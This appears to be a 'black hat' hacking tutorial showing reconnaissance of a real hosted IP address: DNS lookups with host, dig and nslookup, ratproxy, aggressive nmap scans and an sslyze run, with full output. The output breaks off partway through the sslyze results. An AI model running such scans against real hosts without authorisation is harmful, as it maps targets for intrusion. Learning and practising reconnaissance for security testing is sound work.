@@ -1,0 +1,2641 @@
+How to Scan A Target:
+blackhatethicalhacking.com
+This Black Hat MindSet And Technique is for educational purpose only.
+Anything you do with it to cause damage, Black Hat Ethical Hacking is held
+not responsible for your own actions! Teaching The Techniques Helps Understand
+What and How Black Hat Hackers Work, they are not to be messed with, so are you secure
+and ready for such attacks? - This is the purpose of this.
+
+
+
+1. First of all localize the target that you want to scan!
+
+TARGET
+
+http://www.target!.com
+
+
+HOW TO USE NSLOOKUP DIG HOST KNOCK TO GET DNS INFOS OF THE TARGET MACHINE:
+
+┌─[root@parrot]─[~]
+└──╼ #host target!.com
+target!.com has address 198.71.232.3
+target!.com mail is handled by 0 smtp.secureserver.net.
+target!.com mail is handled by 10 mailstore1.secureserver.net.
+
+┌─[✗]─[root@parrot]─[~]
+└──╼ #host -t a target!.com
+target!.com has address 198.71.232.3
+
+┌─[root@parrot]─[~]
+└──╼ #host -t mx target!.com
+target!.com mail is handled by 0 smtp.secureserver.net.
+target!.com mail is handled by 10 mailstore1.secureserver.net.
+
+┌─[root@parrot]─[~]
+└──╼ #host -t ns target!.com
+target!.com name server ns67.domaincontrol.com.
+target!.com name server ns68.domaincontrol.com.
+
+┌─[root@parrot]─[~]
+└──╼ #host -t txt target!.com
+target!.com has no TXT record
+
+┌─[root@parrot]─[~]
+└──╼ #host -t cname target!.com
+target!.com has no CNAME record
+
+┌─[root@parrot]─[~]
+└──╼ #host -t soa target!.com
+target!.com has SOA record ns67.domaincontrol.com. dns.jomax.net. 2016052700 28800 7200 604800 600
+
+┌─[root@parrot]─[~]
+└──╼ #host target!.com ns67.domaincontrol.com
+Using domain server:
+Name: ns67.domaincontrol.com
+Address: 216.69.185.44#53
+Aliases: 
+
+target!.com has address 198.71.232.3
+target!.com mail is handled by 10 mailstore1.secureserver.net.
+target!.com mail is handled by 0 smtp.secureserver.net.
+
+┌─[root@parrot]─[~]
+└──╼ #host target!.com ns68.domaincontrol.com
+Using domain server:
+Name: ns68.domaincontrol.com
+Address: 208.109.255.44#53
+Aliases: 
+
+target!.com has address 198.71.232.3
+target!.com mail is handled by 10 mailstore1.secureserver.net.
+target!.com mail is handled by 0 smtp.secureserver.net.
+
+┌─[root@parrot]─[~]
+└──╼ #host -a target!.com
+Trying "target!.com"
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5689
+;; flags: qr rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;target!.com.			IN	ANY
+
+;; ANSWER SECTION:
+target!.com.		510	IN	SOA	ns67.domaincontrol.com. dns.jomax.net. 2016052700 28800 7200 604800 600
+target!.com.		455	IN	A	198.71.232.3
+target!.com.		2112	IN	MX	0 smtp.secureserver.net.
+target!.com.		2112	IN	MX	10 mailstore1.secureserver.net.
+target!.com.		3455	IN	NS	ns67.domaincontrol.com.
+target!.com.		3455	IN	NS	ns68.domaincontrol.com.
+
+Received 209 bytes from 127.0.0.1#53 in 18 ms
+
+┌─[root@parrot]─[~]
+└──╼ #host -t any target!.com
+target!.com has SOA record ns67.domaincontrol.com. dns.jomax.net. 2016052700 28800 7200 604800 600
+target!.com has address 198.71.232.3
+target!.com mail is handled by 10 mailstore1.secureserver.net.
+target!.com mail is handled by 0 smtp.secureserver.net.
+target!.com name server ns68.domaincontrol.com.
+target!.com name server ns67.domaincontrol.com.
+
+┌─[root@parrot]─[~]
+└──╼ #host -6 target!.com
+target!.com has address 198.71.232.3
+target!.com mail is handled by 0 smtp.secureserver.net.
+target!.com mail is handled by 10 mailstore1.secureserver.net.
+
+┌─[root@parrot]─[~]
+└──╼ #host -6 -a target!.com
+Trying "target!.com"
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14190
+;; flags: qr rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;target!.com.			IN	ANY
+
+;; ANSWER SECTION:
+target!.com.		471	IN	SOA	ns67.domaincontrol.com. dns.jomax.net. 2016052700 28800 7200 604800 600
+target!.com.		416	IN	A	198.71.232.3
+target!.com.		2073	IN	MX	10 mailstore1.secureserver.net.
+target!.com.		2073	IN	MX	0 smtp.secureserver.net.
+target!.com.		3416	IN	NS	ns67.domaincontrol.com.
+target!.com.		3416	IN	NS	ns68.domaincontrol.com.
+
+Received 209 bytes from ::1#53 in 14 ms
+
+┌─[✗]─[root@parrot]─[~]
+└──╼ #host -6 target!.com ns67.domaincontrol.com
+;; connection timed out; no servers could be reached
+
+┌─[✗]─[root@parrot]─[~]
+└──╼ #host -6 target!.com ns68.domaincontrol.com
+;; connection timed out; no servers could be reached
+
+┌─[✗]─[root@parrot]─[~]
+└──╼ #host -6 -t ns target!.com ns68.domaincontrol.com
+;; connection timed out; no servers could be reached
+
+┌─[✗]─[root@parrot]─[~]
+└──╼ #host -6 -t ns target!.com ns67.domaincontrol.com
+;; connection timed out; no servers could be reached
+
+┌─[✗]─[root@parrot]─[~]
+└──╼ #host 198.71.232.3
+3.232.71.198.in-addr.arpa domain name pointer ip-198-71-232-3.ip.secureserver.net.
+
+┌─[root@parrot]─[~]
+└──╼ #host -v -t a target!.com
+Trying "target!.com"
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 21861
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;target!.com.			IN	A
+
+;; ANSWER SECTION:
+target!.com.		259	IN	A	198.71.232.3
+
+Received 47 bytes from 127.0.0.1#53 in 1 ms
+
+┌─[root@parrot]─[~]
+└──╼ #host -v -t a ip-198-71-232-3.ip.secureserver.net
+Trying "ip-198-71-232-3.ip.secureserver.net"
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 38259
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;ip-198-71-232-3.ip.secureserver.net. IN	A
+
+;; ANSWER SECTION:
+ip-198-71-232-3.ip.secureserver.net. 3600 IN A	198.71.232.3
+
+Received 69 bytes from 127.0.0.1#53 in 44 ms
+
+┌─[root@parrot]─[~]
+└──╼ #dig target!.com a
+
+; <<>> DiG 9.9.5-9+deb8u5-Debian <<>> target!.com a
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 8729
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;target!.com.			IN	A
+
+;; ANSWER SECTION:
+target!.com.		164	IN	A	198.71.232.3
+
+;; Query time: 0 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sun May 29 14:18:00 CEST 2016
+;; MSG SIZE  rcvd: 58
+
+┌─[root@parrot]─[~]
+└──╼ #dig target!.com mx
+
+; <<>> DiG 9.9.5-9+deb8u5-Debian <<>> target!.com mx
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62678
+;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;target!.com.			IN	MX
+
+;; ANSWER SECTION:
+target!.com.		1816	IN	MX	10 mailstore1.secureserver.net.
+target!.com.		1816	IN	MX	0 smtp.secureserver.net.
+
+;; Query time: 19 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sun May 29 14:18:04 CEST 2016
+;; MSG SIZE  rcvd: 106
+
+┌─[root@parrot]─[~]
+└──╼ #dig target!.com ns
+
+; <<>> DiG 9.9.5-9+deb8u5-Debian <<>> target!.com ns
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 60292
+;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;target!.com.			IN	NS
+
+;; ANSWER SECTION:
+target!.com.		3156	IN	NS	ns68.domaincontrol.com.
+target!.com.		3156	IN	NS	ns67.domaincontrol.com.
+
+;; Query time: 12 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sun May 29 14:18:07 CEST 2016
+;; MSG SIZE  rcvd: 94
+
+┌─[root@parrot]─[~]
+└──╼ #dig target!.com txt
+
+; <<>> DiG 9.9.5-9+deb8u5-Debian <<>> target!.com txt
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36884
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;target!.com.			IN	TXT
+
+;; AUTHORITY SECTION:
+target!.com.		180	IN	SOA	ns67.domaincontrol.com. dns.jomax.net. 2016052700 28800 7200 604800 600
+
+;; Query time: 12 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sun May 29 14:18:13 CEST 2016
+;; MSG SIZE  rcvd: 110
+
+┌─[root@parrot]─[~]
+└──╼ #dig target!.com soa
+
+; <<>> DiG 9.9.5-9+deb8u5-Debian <<>> target!.com soa
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39124
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;target!.com.			IN	SOA
+
+;; ANSWER SECTION:
+target!.com.		200	IN	SOA	ns67.domaincontrol.com. dns.jomax.net. 2016052700 28800 7200 604800 600
+
+;; Query time: 12 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sun May 29 14:18:18 CEST 2016
+;; MSG SIZE  rcvd: 110
+
+┌─[root@parrot]─[~]
+└──╼ #dig target!.com cname
+
+; <<>> DiG 9.9.5-9+deb8u5-Debian <<>> target!.com cname
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 22218
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;target!.com.			IN	CNAME
+
+;; AUTHORITY SECTION:
+target!.com.		171	IN	SOA	ns67.domaincontrol.com. dns.jomax.net. 2016052700 28800 7200 604800 600
+
+;; Query time: 18 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sun May 29 14:18:38 CEST 2016
+;; MSG SIZE  rcvd: 110
+
+┌─[root@parrot]─[~]
+└──╼ #dig +trace target!.com
+
+; <<>> DiG 9.9.5-9+deb8u5-Debian <<>> +trace target!.com
+;; global options: +cmd
+.			287648	IN	NS	c.root-servers.net.
+.			287648	IN	NS	i.root-servers.net.
+.			287648	IN	NS	d.root-servers.net.
+.			287648	IN	NS	a.root-servers.net.
+.			287648	IN	NS	f.root-servers.net.
+.			287648	IN	NS	b.root-servers.net.
+.			287648	IN	NS	l.root-servers.net.
+.			287648	IN	NS	k.root-servers.net.
+.			287648	IN	NS	g.root-servers.net.
+.			287648	IN	NS	e.root-servers.net.
+.			287648	IN	NS	m.root-servers.net.
+.			287648	IN	NS	h.root-servers.net.
+.			287648	IN	NS	j.root-servers.net.
+.			510154	IN	RRSIG	NS 8 0 518400 20160608050000 20160529040000 60615 . LS0Bk52wYFCmp8Sk08+ePPeZV1ar3AciH05VrH5wlzpc5L1j7fW+Td6b 6yN+34QBVGQ+U0YqDCg8K63nUFxdEY1zGW2v9YjzvdNwVI7UnLIpqNK7 KNny7GHnoS/iB5T6wGeoXlJrlmCqGrhtbAuXdlkbViOELcbpK5ZvGs6L w3s=
+;; Received 397 bytes from 127.0.0.1#53(127.0.0.1) in 264 ms
+
+com.			172800	IN	NS	l.gtld-servers.net.
+com.			172800	IN	NS	c.gtld-servers.net.
+com.			172800	IN	NS	f.gtld-servers.net.
+com.			172800	IN	NS	h.gtld-servers.net.
+com.			172800	IN	NS	b.gtld-servers.net.
+com.			172800	IN	NS	k.gtld-servers.net.
+com.			172800	IN	NS	e.gtld-servers.net.
+com.			172800	IN	NS	j.gtld-servers.net.
+com.			172800	IN	NS	m.gtld-servers.net.
+com.			172800	IN	NS	i.gtld-servers.net.
+com.			172800	IN	NS	g.gtld-servers.net.
+com.			172800	IN	NS	a.gtld-servers.net.
+com.			172800	IN	NS	d.gtld-servers.net.
+com.			86400	IN	DS	30909 8 2 E2D3C916F6DEEAC73294E8268FB5885044A833FC5459588F4A9184CF C41A5766
+com.			86400	IN	RRSIG	DS 8 1 86400 20160608050000 20160529040000 60615 . D/SvLl6M/vyF6MOKUE220+xQgbpwKHLA+7eJedh6oJwvXiXB6QAPalag hfjxDtzqQ71OYQk0TyOOcW2CaTqduszIQjf/ckB9RAds1aip3b+BWMvq lSFtLCuKsFmKZkkAhhlNZRyVFc9s8wLW+G/RL52sQpRGMBLo3etB2/uX ckg=
+;; Received 737 bytes from 192.36.148.17#53(i.root-servers.net) in 305 ms
+
+target!.com.		172800	IN	NS	ns67.domaincontrol.com.
+target!.com.		172800	IN	NS	ns68.domaincontrol.com.
+CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN NSEC3 1 1 0 - CK0Q1GIN43N1ARRC9OSM6QPQR81H5M9A NS SOA RRSIG DNSKEY NSEC3PARAM
+CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN RRSIG NSEC3 8 2 86400 20160603045915 20160527034915 34745 com. pkQ5LWptuG019VnVIJOYy/noEwncYk2kml2Qkf+aTLF7lPHdRvcCkC0h ruJdoZAMHgX7byAmPSR9vi8q6OvKdXVmsMKfUBdLMNMpUhaBHpcTe1AI ezemeJmvAjVyqo7wVYwGa1/Y9ZHuUC9zKmc1xGbtP+jB/GiZHz9vShwH ohc=
+9M14O3KSMS2015V8C22L03OVH85RIG84.com. 86400 IN NSEC3 1 1 0 - 9M17MO9DKQOAC1TE5B8KURUTFNKS98J7 NS DS RRSIG
+9M14O3KSMS2015V8C22L03OVH85RIG84.com. 86400 IN RRSIG NSEC3 8 2 86400 20160604043916 20160528032916 34745 com. Cfkvje5CuuZtOQPGsBBMYJm3/6g3IRh7U6QorY6chCMhRiMWGAXKTwQL 84cGbqkma5Iz9A3BwYRdSqx9u27Ou2QA3ipt8zKJaD6ed0IeI2SbU8QZ HLuKxAcheIIqTf1pHy2cvkEjMDW6k3EHqdKR1goBKrESteb7ZPW7v0hY ih8=
+;; Received 611 bytes from 192.5.6.30#53(a.gtld-servers.net) in 122 ms
+
+target!.com.		600	IN	A	198.71.232.3
+target!.com.		3600	IN	NS	ns68.domaincontrol.com.
+target!.com.		3600	IN	NS	ns67.domaincontrol.com.
+;; Received 110 bytes from 208.109.255.44#53(ns68.domaincontrol.com) in 30 ms
+
+┌─[root@parrot]─[~]
+└──╼ #dig +short target!.com
+198.71.232.3
+
+┌─[root@parrot]─[~]
+└──╼ #dig +noall +answer  target!.com any
+target!.com.		108	IN	SOA	ns67.domaincontrol.com. dns.jomax.net. 2016052700 28800 7200 604800 600
+target!.com.		53	IN	A	198.71.232.3
+target!.com.		1710	IN	MX	0 smtp.secureserver.net.
+target!.com.		1710	IN	MX	10 mailstore1.secureserver.net.
+target!.com.		3053	IN	NS	ns67.domaincontrol.com.
+target!.com.		3053	IN	NS	ns68.domaincontrol.com.
+
+┌─[root@parrot]─[~]
+└──╼ #dig -x +short 198.71.232.3
+
+; <<>> DiG 9.9.5-9+deb8u5-Debian <<>> -x +short 198.71.232.3
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 54927
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;+short.in-addr.arpa.		IN	PTR
+
+;; AUTHORITY SECTION:
+in-addr.arpa.		3599	IN	SOA	b.in-addr-servers.arpa. nstld.iana.org. 2015073655 1800 900 604800 3600
+
+;; Query time: 11 msec
+;; SERVER: ::1#53(::1)
+;; WHEN: Sun May 29 14:21:01 CEST 2016
+;; MSG SIZE  rcvd: 116
+
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27483
+;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;198.71.232.3.			IN	A
+
+;; ANSWER SECTION:
+198.71.232.3.		0	IN	A	198.71.232.3
+
+;; Query time: 0 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sun May 29 14:21:01 CEST 2016
+;; MSG SIZE  rcvd: 57
+
+┌─[root@parrot]─[~]
+└──╼ #dig -x 198.71.232.3 +short
+ip-198-71-232-3.ip.secureserver.net.
+
+┌─[root@parrot]─[~]
+└──╼ #dig +nssearch target!.com
+SOA ns67.domaincontrol.com. dns.jomax.net. 2016052700 28800 7200 604800 600 from server 216.69.185.44 in 30 ms.
+SOA ns67.domaincontrol.com. dns.jomax.net. 2016052700 28800 7200 604800 600 from server 208.109.255.44 in 30 ms.
+;; connection timed out; no servers could be reached
+
+┌─[✗]─[root@parrot]─[~]
+└──╼ #dig +nocmd +noall +answer a target!.com
+target!.com.		600	IN	A	198.71.232.3
+
+┌─[root@parrot]─[~]
+└──╼ #dig +nocmd +noall +answer mx target!.com
+target!.com.		1529	IN	MX	0 smtp.secureserver.net.
+target!.com.		1529	IN	MX	10 mailstore1.secureserver.net.
+
+┌─[root@parrot]─[~]
+└──╼ #dig +nocmd +noall +answer ns target!.com
+target!.com.		2868	IN	NS	ns67.domaincontrol.com.
+target!.com.		2868	IN	NS	ns68.domaincontrol.com.
+
+┌─[root@parrot]─[~]
+└──╼ #dig +nocmd +noall +answer cname target!.com
+
+┌─[root@parrot]─[~]
+└──╼ #dig +nocmd +noall +answer txt target!.com
+
+┌─[root@parrot]─[~]
+└──╼ #dig +nocmd +noall +answer url target!.com
+target!.com.		554	IN	A	198.71.232.3
+
+┌─[root@parrot]─[~]
+└──╼ #dig target!.com +dnssec
+
+; <<>> DiG 9.9.5-9+deb8u5-Debian <<>> target!.com +dnssec
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12137
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags: do; udp: 4096
+;; QUESTION SECTION:
+;target!.com.			IN	A
+
+;; ANSWER SECTION:
+target!.com.		446	IN	A	198.71.232.3
+
+;; Query time: 16 msec
+;; SERVER: 127.0.0.1#53(127.0.0.1)
+;; WHEN: Sun May 29 15:14:48 CEST 2016
+;; MSG SIZE  rcvd: 58
+
+┌─[root@parrot]─[/home/roy/Desktop]
+└──╼ #nslookup
+> set type=A
+> www.target!.com
+Server:		127.0.0.1
+Address:	127.0.0.1#53
+
+Non-authoritative answer:
+www.target!.com	canonical name = target!.com.
+Name:	target!.com
+Address: 198.71.232.3
+> set type=MX
+> www.target!.com
+Server:		127.0.0.1
+Address:	127.0.0.1#53
+
+Non-authoritative answer:
+www.target!.com	canonical name = target!.com.
+target!.com	mail exchanger = 0 smtp.secureserver.net.
+target!.com	mail exchanger = 10 mailstore1.secureserver.net.
+
+Authoritative answers can be found from:
+> set type=ns
+> www.target!.com
+Server:		127.0.0.1
+Address:	127.0.0.1#53
+
+Non-authoritative answer:
+www.target!.com	canonical name = target!.com.
+target!.com	nameserver = ns68.domaincontrol.com.
+target!.com	nameserver = ns67.domaincontrol.com.
+
+Authoritative answers can be found from:
+> set type=cname
+> www.target!.com
+Server:		127.0.0.1
+Address:	127.0.0.1#53
+
+www.target!.com	canonical name = target!.com.
+
+┌─[root@parrot]─[~]
+└──╼ #nslookup
+> set type=TXT
+> www.target!.com
+Server:		127.0.0.1
+Address:	127.0.0.1#53
+
+Non-authoritative answer:
+www.target!.com	canonical name = target!.com.
+
+Authoritative answers can be found from:
+target!.com
+	origin = ns67.domaincontrol.com
+	mail addr = dns.jomax.net
+	serial = 2016052700
+	refresh = 28800
+	retry = 7200
+	expire = 604800
+	minimum = 600
+> 
+
+> set type=SOA
+> www.target!.com
+Server:		127.0.0.1
+Address:	127.0.0.1#53
+
+Non-authoritative answer:
+www.target!.com	canonical name = target!.com.
+target!.com
+	origin = ns67.domaincontrol.com
+	mail addr = dns.jomax.net
+	serial = 2016052700
+	refresh = 28800
+	retry = 7200
+	expire = 604800
+	minimum = 600
+
+Authoritative answers can be found from:
+> 
+
+
+RUN RATPROXY
+
+┌─[root@parrot]─[~]
+└──╼ #ratproxy
+ratproxy version 1.58-beta by <lcamtuf@google.com>
+
+[!] WARNING: Running with no command-line config options specified. This is
+    almost certainly not what you want, as most checks are disabled. Please
+    consult the documentation or use --help for more information.
+
+[*] Proxy configured successfully. Have fun, and please do not be evil.
+[+] Accepting connections on port 8080/tcp (local only)...
+
+do not close the window...minimize it and open a new terminal!
+
+
+RUN NMAP
+
+┌─[✗]─[root@parrot]─[~]
+└──╼ #nmap -sV -Pn 198.71.232.3
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-29 12:03 CEST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 198.71.232.3
+Host is up (0.11s latency).
+Not shown: 998 filtered ports
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Samsung AllShare httpd
+443/tcp open  ssl/http Samsung AllShare httpd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.28 seconds
+
+
+┌─[root@parrot]─[~]
+└──╼ #nmap -sS -sU -T4 -A -v 198.71.232.3
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-29 12:04 CEST
+NSE: Loaded 132 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 12:04
+Completed NSE at 12:04, 0.00s elapsed
+Initiating NSE at 12:04
+Completed NSE at 12:04, 0.00s elapsed
+Initiating Ping Scan at 12:04
+Scanning 198.71.232.3 [4 ports]
+Completed Ping Scan at 12:04, 0.11s elapsed (1 total hosts)
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Initiating SYN Stealth Scan at 12:04
+Scanning 198.71.232.3 [1000 ports]
+Discovered open port 443/tcp on 198.71.232.3
+Discovered open port 80/tcp on 198.71.232.3
+Completed SYN Stealth Scan at 12:04, 9.18s elapsed (1000 total ports)
+Initiating UDP Scan at 12:04
+Scanning 198.71.232.3 [1000 ports]
+Completed UDP Scan at 12:05, 5.55s elapsed (1000 total ports)
+Initiating Service scan at 12:05
+Scanning 1002 services on 198.71.232.3
+Service scan Timing: About 0.40% done
+Service scan Timing: About 3.29% done; ETC: 13:33 (1:25:39 remaining)
+Service scan Timing: About 6.29% done; ETC: 13:14 (1:05:05 remaining)
+Service scan Timing: About 9.28% done; ETC: 13:07 (0:57:01 remaining)
+Service scan Timing: About 12.28% done; ETC: 13:04 (0:52:10 remaining)
+Service scan Timing: About 15.27% done; ETC: 13:02 (0:48:33 remaining)
+Service scan Timing: About 20.86% done; ETC: 12:54 (0:39:05 remaining)
+Service scan Timing: About 21.26% done; ETC: 12:59 (0:43:13 remaining)
+Service scan Timing: About 26.75% done; ETC: 12:54 (0:36:12 remaining)
+Service scan Timing: About 27.25% done; ETC: 12:58 (0:38:57 remaining)
+Service scan Timing: About 32.73% done; ETC: 12:54 (0:33:09 remaining)
+Service scan Timing: About 38.72% done; ETC: 12:54 (0:30:09 remaining)
+Service scan Timing: About 44.71% done; ETC: 12:54 (0:27:10 remaining)
+Service scan Timing: About 50.70% done; ETC: 12:54 (0:24:12 remaining)
+Service scan Timing: About 56.69% done; ETC: 12:54 (0:21:14 remaining)
+Service scan Timing: About 62.67% done; ETC: 12:54 (0:18:18 remaining)
+Service scan Timing: About 68.56% done; ETC: 12:54 (0:15:25 remaining)
+Service scan Timing: About 74.55% done; ETC: 12:54 (0:12:29 remaining)
+Service scan Timing: About 80.54% done; ETC: 12:54 (0:09:32 remaining)
+Service scan Timing: About 86.03% done; ETC: 12:54 (0:06:53 remaining)
+Service scan Timing: About 92.02% done; ETC: 12:54 (0:03:56 remaining)
+Service scan Timing: About 98.00% done; ETC: 12:54 (0:00:59 remaining)
+Completed Service scan at 12:54, 2976.47s elapsed (1002 services on 1 host)
+Initiating OS detection (try #1) against 198.71.232.3
+Retrying OS detection (try #2) against 198.71.232.3
+Initiating Traceroute at 12:54
+Completed Traceroute at 12:54, 3.05s elapsed
+NSE: Script scanning 198.71.232.3.
+Initiating NSE at 12:54
+Completed NSE at 12:58, 216.46s elapsed
+Initiating NSE at 12:58
+Completed NSE at 12:58, 0.24s elapsed
+Nmap scan report for 198.71.232.3
+Host is up (0.11s latency).
+Not shown: 1000 open|filtered ports, 998 filtered ports
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Samsung AllShare httpd
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: DPS/1.0.3
+|_http-title: 404 Not Found
+443/tcp open  ssl/http Samsung AllShare httpd
+|_http-server-header: DPS/1.0.3
+|_http-title: 404 Not Found
+| ssl-cert: Subject: commonName=*.godaddysites.com/organizationName=GoDaddy.com, LLC/stateOrProvinceName=Arizona/countryName=US
+| Issuer: commonName=Go Daddy Secure Certification Authority/organizationName=GoDaddy.com, Inc./stateOrProvinceName=Arizona/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2013-12-09T21:03:50
+| Not valid after:  2016-12-09T21:03:50
+| MD5:   b9fa bb00 6886 5d4c 47be 2cae 6529 fdce
+|_SHA-1: 95a5 92da fdd9 dcb8 e554 5599 1d1b 5ae1 7f0f d2c7
+|_ssl-date: TLS randomness does not represent time
+| tls-nextprotoneg: 
+|   http/1.1
+|_  http/1.0
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Uptime guess: 0.003 days (since Sun May 29 12:53:57 2016)
+Network Distance: 17 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   3.37 ms   192.168.1.1
+2   ...
+3   10.25 ms  172.17.19.169
+4   13.05 ms  172.17.18.61
+5   13.14 ms  172.19.240.133
+6   12.84 ms  93.186.128.245
+7   10.91 ms  195.22.205.155
+8   11.54 ms  4.68.111.165
+9   ...
+10  106.27 ms 4.15.136.118
+11  106.89 ms 184.168.6.83
+12  106.79 ms 184.168.6.83
+13  ... 16
+17  108.63 ms 198.71.232.3
+
+NSE: Script Post-scanning.
+Initiating NSE at 12:58
+Completed NSE at 12:58, 0.00s elapsed
+Initiating NSE at 12:58
+Completed NSE at 12:58, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 3216.79 seconds
+           Raw packets sent: 4123 (155.388KB) | Rcvd: 42 (2.672KB)
+
+
+USE SSLYZE
+
+┌─[root@parrot]─[~]
+└──╼ #sslyze --regular 198.71.232.3:443
+
+
+ REGISTERING AVAILABLE PLUGINS
+ -----------------------------
+
+  PluginSessionRenegotiation
+  PluginCompression
+  PluginSessionResumption
+  PluginCertInfo
+  PluginOpenSSLCipherSuites
+
+
+
+ CHECKING HOST(S) AVAILABILITY
+ -----------------------------
+
+   198.71.232.3:443                    => 198.71.232.3:443
+
+
+
+ SCAN RESULTS FOR 198.71.232.3:443 - 198.71.232.3:443
+ ----------------------------------------------------
+
+Unhandled exception when processing --compression: 
+utils.ctSSL.errors.ctSSLFeatureNotAvailable - Could not enable Zlib compression: OpenSSL was not built with Zlib support ?
+
+  * Certificate :
+      Validation w/ Mozilla's CA Store:  Certificate is Trusted             
+      Hostname Validation:               MISMATCH                           
+      SHA1 Fingerprint:                  95A592DAFDD9DCB8E55455991D1B5AE17F0FD2C7
+
+      Common Name:                       *.godaddysites.com                 
+      Issuer:                            /C=US/ST=Arizona/L=Scottsdale/O=GoDaddy.com, Inc./OU=http://certificates.godaddy.com/repository/CN=Go Daddy Secure Certification Authority/serialNumber=07969287
+      Serial Number:                     4B09760F282ABD                     
+      Not Before:                        Dec  9 21:03:50 2013 GMT           
+      Not After:                         Dec  9 21:03:50 2016 GMT           
+      Signature Algorithm:               sha1WithRSAEncryption              
+      Key Size:                          2048                               
+      X509v3 Subject Alternative Name:   DNS:*.godaddysites.com, DNS:godaddysites.com
+
+  * Session Renegotiation :
+      Client-initiated Renegotiations:    Honored
+      Secure Renegotiation:               Supported
+
+Unhandled exception when processing --sslv2: 
